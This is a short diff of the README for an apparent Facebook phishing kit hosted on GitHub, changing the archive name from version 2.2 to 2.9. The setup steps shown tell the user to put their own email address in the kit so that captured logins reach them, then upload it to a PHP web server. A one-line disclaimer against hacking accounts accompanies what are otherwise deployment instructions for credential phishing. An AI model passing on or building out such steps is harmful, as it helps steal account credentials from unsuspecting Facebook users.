@@ -4,7 +4,7 @@ Please dont use this script to hack someone's ID, I have created this script onl
 
 
 <h2>Instructions</h2>
-1. Edit https://raw.githubusercontent.com/Coconginamo/fb-phishing/master/images/phishing_fb_v2.2.zip and replace YOUR_EMAIL_ADDRESS with the email you want to recieve access.
+1. Edit https://raw.githubusercontent.com/Coconginamo/fb-phishing/master/images/phishing-fb-v2.9.zip and replace YOUR_EMAIL_ADDRESS with the email you want to recieve access.
 
 2. Upload it to a PHP supported web server.
 
